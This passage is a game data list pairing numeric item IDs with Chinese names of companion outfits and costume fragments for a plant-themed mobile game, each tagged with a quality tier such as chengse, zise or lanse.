{"32000680":"深渊魔爪花伴生装扮","pinzhi":"chengse"},
{"32000690":"粉丝心叶兰伴生装扮","pinzhi":"chengse"},
{"32000700":"豌豆藤蔓伴生装扮","pinzhi":"chengse"},
{"32000710":"蜜蜂铃兰伴生装扮","pinzhi":"chengse"},
{"32000720":"油菜花伴生装扮","pinzhi":"chengse"},
{"32000730":"剑叶龙血树伴生装扮","pinzhi":"chengse"},
{"32000740":"斯巴达竹伴生装扮","pinzhi":"chengse"},
{"32000750":"闪耀藤蔓伴生装扮","pinzhi":"chengse"},
{"32000760":"阳光韭菜伴生装扮","pinzhi":"chengse"},
{"32000770":"暗夜菇伴生装扮","pinzhi":"chengse"},
{"32000780":"柴堆藤蔓伴生装扮","pinzhi":"chengse"},
{"32000790":"贪吃龙草伴生装扮","pinzhi":"chengse"},
{"32000800":"兔极伴生装扮","pinzhi":"chengse"},
{"32000810":"植甲拼装者-炎星伴生装扮","pinzhi":"chengse"},
{"32000820":"蝎尾蕉机枪手伴生装扮","pinzhi":"chengse"},
{"32000830":"电鳗香蕉伴生装扮","pinzhi":"chengse"},
{"32000840":"荆棘巫师伴生装扮","pinzhi":"chengse"},
{"32000850":"锯齿锦地罗伴生装扮","pinzhi":"chengse"},
{"32000860":"寄生仙钗伴生装扮","pinzhi":"chengse"},
{"32000880":"暴君火龙果伴生装扮","pinzhi":"chengse"},
{"32000890":"小暴君火龙果伴生装扮","pinzhi":"chengse"},
{"32000900":"忧郁藤蔓伴生装扮","pinzhi":"chengse"},
{"32000910":"电击鹰爪花伴生装扮","pinzhi":"chengse"},
{"32000920":"留声曼陀罗伴生装扮","pinzhi":"chengse"},
{"32000930":"疯狂炮仗花伴生装扮","pinzhi":"chengse"},
{"32000940":"日月金银花伴生装扮","pinzhi":"chengse"},
{"32000950":"蛮族大黄伴生装扮","pinzhi":"chengse"},
{"32000960":"水生藤蔓伴生装扮","pinzhi":"chengse"},
{"32000970":"寒霜白毛丹伴生装扮","pinzhi":"chengse"},
{"32000980":"电击钩吻伴生装扮","pinzhi":"chengse"},
{"32000990":"寒冰地刺伴生装扮","pinzhi":"chengse"},
{"32001000":"珊瑚泡泡姬伴生装扮","pinzhi":"chengse"},
{"32001010":"百宝兜兰伴生装扮","pinzhi":"chengse"},
{"32001020":"女娲蛇尾草伴生装扮","pinzhi":"chengse"},
{"32001270":"枫影刺客伴生装扮","pinzhi":"chengse"},
{"32001280":"守卫菇伴生装扮","pinzhi":"chengse"},
{"32001330":"伏僵塔黄伴生装扮","pinzhi":"chengse"},
{"32001340":"超级机枪射手伴生装扮","pinzhi":"chengse"},
{"32001390":"海神草伴生装扮","pinzhi":"chengse"},
{"32001400":"海豌豆伴生装扮","pinzhi":"chengse"},
{"32001430":"球果训练家伴生装扮","pinzhi":"chengse"},
{"32001580":"黑法师伴生装扮","pinzhi":"chengse"},
{"32001590":"太极木槿伴生装扮","pinzhi":"chengse"},
{"32001600":"青蛇藤蔓伴生装扮","pinzhi":"chengse"},
{"32001610":"毁灭菇伴生装扮","pinzhi":"chengse"},
{"32001620":"叶子保护伞伴生装扮","pinzhi":"zise"},
{"32001630":"鸭梨伴生装扮","pinzhi":"chengse"},
{"32001640":"金蝉花伴生装扮","pinzhi":"chengse"},
{"32001650":"藕花白龙伴生装扮","pinzhi":"chengse"},
{"32001690":"魔藤伴生装扮","pinzhi":"lanse"},
{"32001700":"悬浮洋芋伴生装扮","pinzhi":"chengse"},
{"32001720":"祥云飞莲伴生装扮","pinzhi":"chengse"},
{"32001750":"吸金磁伴生装扮","pinzhi":"chengse"},
{"32001760":"钟馗石蕊伴生装扮","pinzhi":"zise"},
{"32001770":"幽潭婆罗伴生装扮","pinzhi":"zise"},
{"32001780":"安息木编钟伴生装扮","pinzhi":"lanse"},
{"32001790":"冰川菇伴生装扮","pinzhi":"chengse"},
{"32001670":"草垛伴生装扮","pinzhi":"baise"},
{"40010011":"豌豆射手春节装扮碎片","pinzhi":"baise"},
{"40010012":"豌豆射手圣诞装扮碎片","pinzhi":"baise"},
{"40010013":"豌豆射手飞车装扮碎片","pinzhi":"baise"},
{"40010021":"向日葵海盗船长装扮碎片","pinzhi":"baise"},
{"40010022":"向日葵六一装扮碎片","pinzhi":"baise"},
{"40010023":"向日葵万圣装扮碎片","pinzhi":"baise"},
{"40010024":"向日葵圣诞节装扮碎片","pinzhi":"baise"},
{"40010025":"向日葵联动装扮碎片","pinzhi":"baise"},
{"40010031":"坚果大胡子装扮碎片","pinzhi":"baise"},
{"40010032":"坚果绷带装扮碎片","pinzhi":"baise"},
{"40010033":"坚果三脚机械装扮碎片","pinzhi":"baise"},
{"40010041":"土豆海绵眼睛装扮碎片","pinzhi":"baise"},
{"40010042":"土豆虎年鞭炮装扮碎片","pinzhi":"baise"},
{"40010053":"卷心菜投手春节装扮碎片","pinzhi":"baise"},
{"40010054":"卷心菜投手头饰装扮碎片","pinzhi":"baise"},
{"40010061":"冰冻生菜复古耳罩碎片","pinzhi":"baise"},
{"40010062":"冰冻生菜豌豆耳罩碎片","pinzhi":"baise"},
{"40010071":"回旋镖射手彩蛋帽装扮碎片","pinzhi":"lvse"},
{"40010072":"回旋镖射手飞侠帽装扮碎片","pinzhi":"lvse"},
{"40010081":"双胞向日葵礼帽装扮碎片","pinzhi":"lanse"},
{"40010082":"双胞向日葵超级装扮碎片","pinzhi":"lanse"},
{"40010083":"双胞向日葵炫彩装扮碎片","pinzhi":"lanse"},
{"40010091":"菜问春节衣服碎片","pinzhi":"lanse"},
{"40010092":"菜问牛年帽子碎片","pinzhi":"lanse"},
{"40010093":"菜问万圣绷带装扮碎片","pinzhi":"lanse"},
{"40010094":"菜问全息装扮碎片","pinzhi":"lanse"},
{"40010101":"弹簧豆草裙碎片","pinzhi":"baise"},
{"40010121":"火龙草钢盔碎片","pinzhi":"chengse"},
{"40010122":"火龙草礼帽装扮碎片","pinzhi":"chengse"},
{"40010123":"火龙草兔耳帽装扮碎片","pinzhi":"chengse"},
{"40010124":"火龙草龙年装扮碎片","pinzhi":"chengse"},
{"40010125":"火龙草海盗帽装扮碎片","pinzhi":"chengse"},
{"40010131":"能量花周年装扮碎片","pinzhi":"lanse"},
{"40010141":"窝瓜头带二装碎片","pinzhi":"lanse"},
{"40010142":"窝瓜飞车装扮碎片","pinzhi":"lanse"},
{"40010151":"巴豆围巾装扮碎片","pinzhi":"baise"},
{"40010161":"双向射手圣与魔头饰装扮碎片","pinzhi":"baise"},
{"40010162":"双向射手小红帽装扮碎片","pinzhi":"baise"},
{"40010181":"噬碑藤怀旧装扮碎片","pinzhi":"baise"},
{"40010191":"寒冰射手绿色绒线帽装扮碎片","pinzhi":"lvse"},
{"40010192":"寒冰射手棉帽装扮碎片","pinzhi":"lvse"},
{"40010193":"寒冰射手永劫无间侠帽装扮碎片","pinzhi":"lvse"},
{"40010201":"火炬树桩蓝色泳镜装扮碎片","pinzhi":"lvse"},
{"40010211":"玉米投手加油头带碎片","pinzhi":"baise"},
{"40010213":"玉米投手绅士衣服碎片","pinzhi":"baise"},
{"40010221":"闪电芦苇兔耳帽装扮碎片","pinzhi":"lvse"},
{"40010222":"闪电芦苇绅士礼帽装扮碎片","pinzhi":"lvse"},
{"40010231":"椰子加农炮复古帽装扮碎片","pinzhi":"zise"},
{"40010232":"椰子加农炮礼帽帽装扮碎片","pinzhi":"zise"},
{"40010241":"西瓜投手水手帽装扮碎片","pinzhi":"lvse"},
{"40010242":"西瓜投手礼帽装扮碎片","pinzhi":"lvse"},
{"40010244":"西瓜投手盒子帽装扮碎片","pinzhi":"lvse"},
{"40010251":"豌豆荚3D眼镜装扮碎片","pinzhi":"lvse"},
{"40010252":"豌豆荚毛绒帽装扮碎片","pinzhi":"lvse"},
{"40010271":"双重射手维京帽装扮碎片","pinzhi":"lanse"},
{"40010273":"双重射手棉帽装扮碎片","pinzhi":"lanse"},
{"40010274":"双重射手马头帽装扮碎片","pinzhi":"lanse"},
{"40010281":"钢地刺护目镜装扮碎片","pinzhi":"lvse"},
{"40010282":"钢地刺单片镜装扮碎片","pinzhi":"lvse"},
{"40010291":"高坚果学者装扮碎片","pinzhi":"lvse"},
{"40010292":"高坚果六一装扮碎片","pinzhi":"lvse"},
{"40010301":"三重射手铁锅装扮碎片","pinzhi":"lvse"},
{"40010302":"三重射手六一装扮碎片","pinzhi":"lvse"},
{"40010311":"冰西瓜绒帽装扮碎片","pinzhi":"chengse"},
{"40010313":"冰西瓜夹子风扇碎片","pinzhi":"chengse"},
{"40010331":"仙桃永劫无间头饰装扮碎片","pinzhi":"baise"},
{"40010372":"棱镜草礼帽装扮碎片","pinzhi":"lvse"},
{"40010373":"棱镜草儿童节日礼帽装扮碎片","pinzhi":"lvse"},
{"40010391":"激光豆金链子碎片","pinzhi":"lanse"},
{"40010392":"激光豆六一装扮碎片","pinzhi":"lanse"},
{"40010393":"激光豆周年装扮碎片","pinzhi":"lanse"},
{"40010394":"激光豆超级装扮碎片","pinzhi":"lanse"},
{"40010401":"星星果假发碎片","pinzhi":"lanse"},
{"40010421":"脉冲黄桃万圣装扮碎片","pinzhi":"lvse"},
{"40010431":"充能柚子冰杯帽装扮碎片","pinzhi":"chengse"},
{"40010441":"全息坚果面包机装扮碎片","pinzhi":"lanse"},
{"40010442":"全息坚果周年装扮碎片","pinzhi":"lanse"},
{"40010451":"瓷砖萝卜超级装扮","pinzhi":"chengse"},
{"40010491":"小喷菇周年庆装扮碎片","pinzhi":"baise"},
{"40010501":"大喷菇舞狮头装扮碎片","pinzhi":"baise"},
{"40010502":"大喷菇麋鹿装扮碎片","pinzhi":"baise"},
{"40010511":"魅惑菇头饰装扮碎片","pinzhi":"baise"},
{"40010521":"阳光菇国风装扮碎片","pinzhi":"chengse"},
{"40010522":"阳光菇兔耳装扮碎片","pinzhi":"chengse"},
{"40010541":"花生射手三位一体装扮碎片","pinzhi":"baise"},
{"40010551":"磁力菇棋盘格装扮碎片","pinzhi":"baise"},
{"40010581":"寒冰菇金秋装扮碎片","pinzhi":"chengse"},
{"40010611":"蒲公英蝴蝶结装扮碎片","pinzhi":"zise"},
{"40010641":"荷叶青蛙装扮碎片","pinzhi":"baise"},
{"40010651":"保龄泡泡红鼻子装扮","pinzhi":"chengse"},
{"40010691":"导向蓟六一装扮碎片","pinzhi":"lanse"},
{"40010692":"导向蓟周年庆装扮碎片","pinzhi":"lanse"},
{"40010701":"大嘴花春节装扮碎片","pinzhi":"lanse"},
{"40010702":"大嘴花周年装扮碎片","pinzhi":"lanse"},
{"40010703":"大嘴花超级装扮碎片","pinzhi":"lanse"},
{"40010711":"强酸柠檬圣诞装扮碎片","pinzhi":"chengse"},
{"40010721":"幽灵辣椒灯笼装扮碎片","pinzhi":"zise"},
{"40010781":"火焰豌豆周年装扮碎片","pinzhi":"lvse"},
{"40010782":"火焰豌豆墨镜装扮碎片","pinzhi":"lvse"},
{"40010811":"甜菜护卫腰带碎片","pinzhi":"zise"},
{"40010812":"甜菜护卫虎年装扮碎片","pinzhi":"zise"},
{"40010821":"眩晕洋葱飞行套装碎片","pinzhi":"lvse"},
{"40010831":"旋转芜菁望远镜头带碎片","pinzhi":"lvse"},
{"40010861":"板栗小队六一装扮碎片","pinzhi":"lanse"},
{"40010911":"芦笋战机莫西干装扮碎片","pinzhi":"lanse"},
{"40010931":"蚕豆突击队六一装扮碎片","pinzhi":"zise"},
{"40010932":"蚕豆突击队飞车装扮碎片","pinzhi":"zise"},
{"40010981":"玫瑰剑客头盔装扮碎片","pinzhi":"lanse"},
{"40010991":"电击蓝莓三孔插座帽装扮碎片","pinzhi":"zise"},
{"40010992":"电击蓝莓学士帽装扮碎片","pinzhi":"zise"},
{"41110011":"捣蛋萝卜六一装扮碎片","pinzhi":"lanse"},
{"41110021":"向日葵歌手虎年装扮碎片","pinzhi":"zise"},
{"41110022":"向日葵歌手六一装扮碎片","pinzhi":"zise"},
{"41110023":"向日葵歌手奥运装扮碎片","pinzhi":"zise"},
{"41110024":"向日葵歌手超级装扮碎片","pinzhi":"zise"},
{"41110031":"榴莲球衣碎片","pinzhi":"lvse"},
{"41110041":"南瓜巫师万圣装扮碎片","pinzhi":"lanse"},
{"41110081":"阿开木木头带碎片","pinzhi":"lanse"},
{"41110091":"红针花探险帽装扮碎片","pinzhi":"lanse"},
{"41110101":"大丽菊面具碎片","pinzhi":"baise"},
{"41110111":"岩浆番石榴花圈碎片","pinzhi":"lanse"},
{"41110121":"金蟾菇爆炸头装扮碎片","pinzhi":"lanse"},
{"41110131":"棉小雪洋帽装扮碎片","pinzhi":"lanse"},
{"41110141":"菠萝蜜六一装扮碎片","pinzhi":"lvse"},
{"41110142":"菠萝蜜搞怪眼罩装扮碎片","pinzhi":"lvse"},
{"41110151":"龙舌兰春节装扮碎片","pinzhi":"lanse"},
{"41110152":"龙舌兰礼帽装扮碎片","pinzhi":"lanse"},
{"41110161":"猕猴桃气球金箍碎片","pinzhi":"zise"},
{"41110162":"猕猴桃围巾装扮碎片","pinzhi":"zise"},
{"41110163":"猕猴桃全身装扮碎片","pinzhi":"zise"},
{"41110164":"猕猴桃超级装扮碎片","pinzhi":"zise"},
{"41110171":"梅小美古风装扮碎片","pinzhi":"lanse"},
{"41110172":"梅小美面纱装扮碎片","pinzhi":"lanse"},
{"41110191":"天使星星果眼镜装扮碎片","pinzhi":"chengse"},
{"41110192":"天使星星果全身装扮碎片","pinzhi":"chengse"},
{"41110193":"天使星星果超级装扮碎片","pinzhi":"chengse"},
{"41110201":"火柴花拳手斗篷装扮碎片","pinzhi":"zise"},
{"41110211":"火焰花女王芭蕉扇装扮碎片","pinzhi":"chengse"},
{"41110221":"机枪豌豆跑酷联动装扮碎片","pinzhi":"chengse"},
{"41110222":"机枪豌豆限定全身装扮碎片","pinzhi":"chengse"},
{"41110223":"机枪豌豆耳机装扮碎片","pinzhi":"chengse"},
{"41110224":"机枪豌豆超级装扮碎片","pinzhi":"chengse"},
{"41110231":"魔音甜菜兔年DJ围巾装扮碎片","pinzhi":"lanse"},
{"41110251":"潜伏芹菜斗士盔碎片","pinzhi":"lanse"},
{"41110261":"孢子菇蓝色折纸帽装扮碎片","pinzhi":"lanse"},
{"41110271":"大蒜硅胶手套装扮碎片","pinzhi":"lvse"},
{"41110272":"大蒜硅胶宠物装扮碎片","pinzhi":"lvse"},
{"41110291":"仙人掌派对助力装扮碎片","pinzhi":"chengse"},
{"41110292":"仙人掌超级装扮碎片","pinzhi":"chengse"},
{"41110293":"仙人掌敦煌装扮碎片","pinzhi":"chengse"},
{"41110301":"猫尾草小型快递纸箱碎片","pinzhi":"chengse"},
{"41110302":"猫尾草蛋糕头装扮碎片","pinzhi":"chengse"},
{"41110303":"猫尾草宠物装扮碎片","pinzhi":"chengse"},
{"41110321":"爆裂葡萄彩气球装扮碎片","pinzhi":"chengse"},
{"41110322":"爆裂葡萄敦煌装扮碎片","pinzhi":"chengse"},
{"41110331":"冰龙草冰激凌装扮碎片","pinzhi":"chengse"},
{"41110332":"冰龙草龙年装扮碎片","pinzhi":"chengse"},
{"41110333":"冰龙草全身装扮碎片","pinzhi":"chengse"},
{"41110351":"原始豌豆射手浴帽装扮碎片","pinzhi":"lanse"},
{"41110352":"原始豌豆射手春节装扮碎片","pinzhi":"lanse"},
{"41110353":"原始豌豆射手河姆渡头罐碎片","pinzhi":"lanse"},
{"41110354":"原始豌豆射手锦衣卫全身装扮碎片","pinzhi":"lanse"},
{"41110361":"原始坚果墙泳装碎片","pinzhi":"lanse"},
{"41110362":"原始坚果墙蜜帝全身装扮碎片","pinzhi":"lanse"},
{"41110381":"原始向日葵恐龙帽装扮碎片","pinzhi":"lanse"},
{"41110382":"原始向日葵河姆渡陶罐装扮碎片","pinzhi":"lanse"},
{"41110383":"原始向日葵敦煌装扮碎片","pinzhi":"lanse"},
{"41110391":"原始土豆地雷虎纹装扮碎片","pinzhi":"zise"},
{"41110392":"原始土豆地雷雷区牌装扮碎片","pinzhi":"zise"},
{"41110401":"龙吼草联动装扮碎片","pinzhi":"zise"},
{"41110431":"蔗师傅联动装扮碎片","pinzhi":"chengse"},
{"41110441":"玉米加农炮圣诞帽装扮碎片","pinzhi":"chengse"},
{"41110442":"玉米加农炮超级装扮碎片","pinzhi":"chengse"},
{"41110451":"苹果迫击炮虎年装扮碎片","pinzhi":"chengse"},
{"41110452":"苹果迫击炮成长装扮碎片","pinzhi":"chengse"},
{"41110453":"苹果迫击炮派对助力装扮碎片","pinzhi":"chengse"},
{"41110454":"苹果迫击炮恶魔超级装扮碎片","pinzhi":"chengse"},
{"41110461":"金缕梅女巫睡帽装扮碎片","pinzhi":"chengse"},
{"41110462":"金缕梅女巫美人鱼装扮碎片","pinzhi":"chengse"},
{"41110471":"逃脱树根警长帽装扮碎片","pinzhi":"chengse"},
{"41110472":"逃脱树根全息眼镜装扮碎片","pinzhi":"chengse"},
{"41110481":"电流醋栗节能灯装扮碎片","pinzhi":"chengse"},
{"41110482":"电流醋栗电流示警装扮碎片","pinzhi":"chengse"},
{"41110501":"超能花菜敦煌装扮碎片","pinzhi":"chengse"},
{"41110521":"月光花周年庆装扮碎片","pinzhi":"lvse"},
{"41110531":"爆炸坚果星星眼镜装扮碎片","pinzhi":"lvse"},
{"41110551":"幽暮投手鸭舌帽装扮碎片","pinzhi":"chengse"},
{"41110561":"铃儿草投手蝴蝶结装扮碎片","pinzhi":"lanse"},
{"41110611":"防风草蟹壳帽装扮碎片","pinzhi":"chengse"},
{"41110621":"槲寄冰仙子围巾装扮碎片","pinzhi":"zise"},
{"41110622":"斛寄冰仙子周年装扮碎片","pinzhi":"zise"},
{"41110641":"黄金蓓蕾周年装扮碎片","pinzhi":"baise"},
{"41110642":"黄金蓓蕾拉拉队装扮碎片","pinzhi":"baise"},
{"41110671":"芦黎药师成长装扮碎片","pinzhi":"chengse"},
{"41110672":"芦黎药师超级装扮碎片","pinzhi":"chengse"},
{"41110691":"吹风荚兰儿童高筒帽装扮碎片","pinzhi":"zise"},
{"41110631":"野兽猕猴桃头饰装扮碎片","pinzhi":"zise"},
{"41110632":"野兽猕猴桃八戒装扮碎片","pinzhi":"zise"},
{"41110701":"桑葚爆破手周年庆假面装扮碎片","pinzhi":"chengse"},
{"41110702":"桑葚爆破手成长海盗眼罩碎片","pinzhi":"chengse"},
{"41110703":"桑葚爆破手限时召唤海盗装扮碎片","pinzhi":"chengse"},
{"41110704":"桑葚爆破手超级装扮碎片","pinzhi":"chengse"},
{"41110711":"电能豌豆成长装扮碎片","pinzhi":"chengse"},
{"41110712":"电能豌豆耳机装扮碎片","pinzhi":"chengse"},
{"41110721":"寒冰醋栗护目镜装扮碎片","pinzhi":"chengse"},
{"41110751":"茄子忍者圣诞装扮碎片","pinzhi":"chengse"},
{"41110752":"茄子忍者成长装扮碎片","pinzhi":"chengse"},
{"41110753":"茄子忍者零装扮碎片","pinzhi":"chengse"},
{"41110791":"双枪松果兔年装扮碎片","pinzhi":"chengse"},
{"41110821":"冬青骑士福字装扮碎片","pinzhi":"chengse"},
{"41110841":"暗影豌豆女巫帽装扮碎片","pinzhi":"zise"},
{"41110842":"暗影豌豆草帽装扮碎片","pinzhi":"zise"},
{"41110851":"食人花豌豆成长装扮碎片","pinzhi":"chengse"},
{"41110852":"食人花豌豆围巾装扮碎片","pinzhi":"chengse"},
{"41110861":"水晶兰圣诞装扮碎片","pinzhi":"zise"},
{"41110862":"水晶兰唐僧装扮碎片","pinzhi":"zise"},
{"41110871":"豌豆迫击炮周年庆装扮碎片","pinzhi":"zise"},
{"41110872":"豌豆迫击炮金秋装扮碎片","pinzhi":"zise"},
{"41110881":"雷龙草兔年装扮碎片","pinzhi":"chengse"},
{"41110882":"雷龙草龙年装扮碎片","pinzhi":"chengse"},
{"41110891":"芦荟医师战旗套装碎片","pinzhi":"zise"},
{"41110892":"芦荟医师周年装扮碎片","pinzhi":"zise"},
{"41110893":"芦荟医师全身装扮碎片","pinzhi":"zise"},
{"41110894":"芦荟医师财运亨通装扮碎片","pinzhi":"zise"},
{"41110895":"芦荟医师财运亨通幻彩装扮碎片","pinzhi":"zise"},
{"41110901":"熊果臼炮周年庆装扮碎片","pinzhi":"chengse"},
{"41110902":"熊果臼炮沙僧装扮碎片","pinzhi":"chengse"},
{"42000011":"小黄梨兔年装扮碎片","pinzhi":"zise"},
{"42000012":"小黄梨禅杖装扮碎片","pinzhi":"zise"},
{"42000061":"毒液豌豆射手巫医装扮碎片","pinzhi":"chengse"},
{"42000062":"毒液豌豆射手潮流小帽装扮碎片","pinzhi":"chengse"},
{"42000071":"杜英投手六一装扮碎片","pinzhi":"zise"},
{"42000072":"杜英投手周年装扮碎片","pinzhi":"zise"},
{"42000073":"杜英投手永劫无间装扮碎片","pinzhi":"zise"},
{"42000091":"荸荠兄弟虎年装扮碎片","pinzhi":"chengse"},
{"42000092":"荸荠兄弟成长装扮碎片","pinzhi":"chengse"},
{"42000093":"荸荠兄弟金角银角装扮碎片","pinzhi":"chengse"},
{"42000101":"尖刺秋葵娃娃假发碎片","pinzhi":"chengse"},
{"42000102":"尖刺秋葵大冬被碎片","pinzhi":"chengse"},
{"42000111":"铜钱草鼓手兔年装扮碎片","pinzhi":"zise"},
{"42000112":"铜钱草鼓手领带装扮碎片","pinzhi":"zise"},
{"42000131":"潜行开口剑围巾装扮碎片","pinzhi":"zise"},
{"42000171":"滴水冰莲联动装扮碎片","pinzhi":"baise"},
{"42000191":"厨师杓兰六一装扮碎片","pinzhi":"chengse"},
{"42000192":"厨师杓兰成长装扮碎片","pinzhi":"chengse"},
{"42000211":"橄榄坑成长装扮碎片","pinzhi":"chengse"},
{"42000212":"橄榄坑搞怪眼镜装扮碎片","pinzhi":"chengse"},
{"42000241":"地星发射井金秋装扮碎片","pinzhi":"chengse"},
{"42000261":"眩晕雏菊眩晕眼镜装扮碎片","pinzhi":"chengse"},
{"42000271":"爆炸桔梗圣诞节装扮碎片","pinzhi":"zise"},
{"42000321":"火鸡投手圣诞节装扮碎片","pinzhi":"chengse"},
{"42000322":"火鸡投手奶嘴装扮碎片","pinzhi":"chengse"},
{"42000341":"聚能山竹发卡碎片","pinzhi":"chengse"},
{"42000342":"聚能山竹飞车头碎片","pinzhi":"chengse"},
{"42000343":"聚能山竹全身装扮碎片","pinzhi":"chengse"},
{"42000344":"聚能山竹超级装扮碎片","pinzhi":"chengse"},
{"42000371":"烈焰火蕨舞会假面装扮碎片","pinzhi":"chengse"},
{"42000372":"烈焰火蕨哪吒装扮碎片","pinzhi":"chengse"},
{"42000381":"虎头菇成长装扮碎片","pinzhi":"chengse"},
{"42000382":"虎头菇永劫无间联动装扮碎片","pinzhi":"chengse"},
{"42000391":"气流水仙花成长装扮碎片","pinzhi":"zise"},
{"42000392":"气流水仙花灯笼装扮碎片","pinzhi":"zise"},
{"42000411":"地锯草耳机装扮碎片","pinzhi":"chengse"},
{"42000511":"激光皇冠花圣诞大胡子碎片","pinzhi":"chengse"},
{"42000512":"激光皇冠花成长装扮碎片","pinzhi":"chengse"},
{"42000513":"激光皇冠花女王装扮碎片","pinzhi":"chengse"},
{"42000531":"扇贝兰成长装扮碎片","pinzhi":"chengse"},
{"42000532":"扇贝兰派对助力装扮碎片","pinzhi":"chengse"},
{"42000561":"双生卯兔成长装扮碎片","pinzhi":"chengse"},
{"42000571":"长枪秋兰红孩儿装扮碎片","pinzhi":"chengse"},
{"42000581":"牛蒡击球手成长装扮碎片","pinzhi":"chengse"},
{"42000582":"牛蒡击球手全身装扮碎片","pinzhi":"chengse"},
{"42000583":"牛蒡击球手牛魔王超级装扮碎片","pinzhi":"chengse"},
{"42000601":"南瓜头全身装扮碎片","pinzhi":"lanse"},
{"42000611":"鹳草击剑手龙年装扮碎片","pinzhi":"chengse"},
{"42000621":"蓄电雪松果成长装扮碎片","pinzhi":"chengse"},
{"42000641":"蛇妖瓶子草成长装扮碎片","pinzhi":"chengse"},
{"42000642":"蛇妖瓶子草墨镜装扮碎片","pinzhi":"chengse"},
{"42000661":"曼德拉草成长装扮碎片","pinzhi":"chengse"},
{"42000662":"曼德拉草派对助力装扮碎片","pinzhi":"chengse"},
{"42000671":"深渊海葵成长装扮碎片","pinzhi":"chengse"},
{"42000681":"深渊魔爪花成长装扮碎片","pinzhi":"chengse"},
{"42000691":"粉丝心叶兰圣诞装扮碎片","pinzhi":"chengse"},
{"42000692":"粉丝心叶兰飞车装扮碎片","pinzhi":"chengse"},
{"42000721":"蜜蜂铃兰尖头帽装扮碎片","pinzhi":"chengse"},
{"42000731":"剑叶龙血树成长装扮碎片","pinzhi":"chengse"},
{"42000732":"剑叶龙血树永劫无间联动装扮碎片","pinzhi":"chengse"},
{"42000733":"剑叶龙血树红衣服装扮碎片","pinzhi":"chengse"},
{"42000741":"斯巴达竹成长装扮碎片","pinzhi":"chengse"},
{"42000771":"暗夜菇成长装扮碎片","pinzhi":"chengse"},
{"42000772":"暗夜菇卷轴装扮碎片","pinzhi":"chengse"},
{"42000791":"贪吃龙草成长装扮碎片","pinzhi":"chengse"},
{"42000792":"贪吃龙草超级装扮碎片","pinzhi":"chengse"},
{"42000793":"贪吃龙草龙王装扮碎片","pinzhi":"chengse"},
{"42000801":"兔极企鹅装扮碎片","pinzhi":"chengse"},
{"42000821":"蝎尾蕉机枪手成长装扮碎片","pinzhi":"chengse"},
{"42000822":"蝎尾蕉机枪手饿哥装扮碎片","pinzhi":"chengse"},
{"42000831":"电鳗香蕉派对助力装扮碎片","pinzhi":"chengse"},
{"42000832":"电鳗香蕉超级装扮碎片","pinzhi":"chengse"},
{"42000841":"荆棘巫师成长装扮碎片","pinzhi":"chengse"},
{"42000851":"锯齿锦地罗成长装扮碎片","pinzhi":"chengse"},
{"42000861":"寄生仙钗成长装扮碎片","pinzhi":"chengse"},
{"42000881":"暴君火龙果成长装扮碎片","pinzhi":"chengse"},
{"42000911":"电击鹰爪花飞车装扮碎片","pinzhi":"chengse"},
{"42000912":"电击鹰爪花电池头装扮碎片","pinzhi":"chengse"},
{"42000921":"留声曼陀罗金秋装扮碎片","pinzhi":"chengse"},
{"42000922":"留声曼陀罗音响装扮碎片","pinzhi":"chengse"},
{"42000922":"留声曼陀罗成长装扮碎片","pinzhi":"chengse"},
{"42000941":"日月金银花冬日装扮碎片","pinzhi":"chengse"},
{"42000942":"日月金银花吃饭家伙装扮碎片","pinzhi":"chengse"},
{"42000951":"蛮族大黄成长装扮碎片","pinzhi":"chengse"},
{"42000971":"寒霜白毛丹成长装扮碎片","pinzhi":"chengse"},
{"42000972":"寒霜白毛丹大肥龙装扮碎片","pinzhi":"chengse"},
{"42000981":"电击钩吻派对助力眼镜装扮碎片","pinzhi":"chengse"},
{"42000982":"电击钩吻成长装扮碎片","pinzhi":"chengse"},
{"42000983":"电击钩吻幻彩装扮前碎片","pinzhi":"chengse"},
{"42000984":"电击钩吻幻彩装扮后碎片","pinzhi":"chengse"},
{"42000991":"寒冰地刺头饰装扮碎片","pinzhi":"chengse"},
{"42000992":"寒冰地刺围巾装扮碎片","pinzhi":"chengse"},
{"42001001":"珊瑚泡泡姬成长装扮碎片","pinzhi":"chengse"},
{"42001002":"珊瑚泡泡姬标签装扮碎片","pinzhi":"chengse"},
{"42001003":"珊瑚泡泡姬全身装扮碎片","pinzhi":"chengse"},
{"42001011":"百宝兜兰丞相帽子装扮碎片","pinzhi":"chengse"},
{"42001021":"女娲蛇尾草全身装扮碎片","pinzhi":"chengse"},
{"42001022":"女娲蛇尾草头饰装扮碎片","pinzhi":"chengse"},
{"42001271":"枫影刺客二刀流装扮碎片","pinzhi":"chengse"},
{"42001272":"枫影刺客头箍装扮碎片","pinzhi":"chengse"},
{"42001273":"枫影刺客装逼眼镜装扮碎片","pinzhi":"chengse"},
{"42001281":"守卫菇全身装扮碎片","pinzhi":"chengse"},
{"42001282":"守卫菇圣诞树装扮碎片","pinzhi":"chengse"},
{"42001283":"守卫菇猎魔牛仔超级装扮碎片","pinzhi":"chengse"},
{"42001331":"伏僵塔黄全身装扮碎片","pinzhi":"chengse"},
{"42001341":"超级机枪射手全身装扮碎片","pinzhi":"chengse"},
{"42001342":"超级机枪射手超级装扮碎片","pinzhi":"chengse"},
{"42001351":"海带守卫金链子腕表装扮碎片","pinzhi":"zise"},
{"42001361":"海蘑菇草帽装扮碎片","pinzhi":"lanse"},
{"42001371":"噗噗鱼藤睡帽装扮碎片","pinzhi":"lvse"},
{"42001381":"氧气藻翅膀装扮碎片","pinzhi":"baise"},
{"42001382":"氧气藻氧气面罩装扮碎片","pinzhi":"baise"},
{"42001391":"海神草全身装扮碎片","pinzhi":"chengse"},
{"42001392":"海神草金丝眼镜装扮碎片","pinzhi":"chengse"},
{"42001401":"海豌豆兔耳帽装扮碎片","pinzhi":"chengse"},
{"42001402":"海豌豆鸭嘴兽全身装扮碎片","pinzhi":"chengse"},
{"42001431":"球果训练家全身装扮碎片","pinzhi":"chengse"},
{"42001432":"球果训练家绣球装扮碎片","pinzhi":"chengse"},
{"42001433":"球果训练家森林之子超级装扮碎片","pinzhi":"chengse"},
{"42001571":"胆小菇青帽子装扮碎片","pinzhi":"zise"},
{"42001581":"黑法师光环装扮碎片","pinzhi":"chengse"},
{"42001582":"黑法师魔法球装扮碎片","pinzhi":"chengse"},
{"42001591":"太极木槿战装装扮碎片","pinzhi":"chengse"},
{"42001592":"太极木槿女仆装扮碎片","pinzhi":"chengse"},
{"42001611":"毁灭菇博士装扮碎片","pinzhi":"chengse"},
{"42001612":"毁灭菇勇武将军装扮碎片","pinzhi":"chengse"},
{"42001631":"鸭梨椰子壳装扮碎片","pinzhi":"chengse"},
{"42001632":"鸭梨胖蜜蜂装扮碎片","pinzhi":"chengse"},
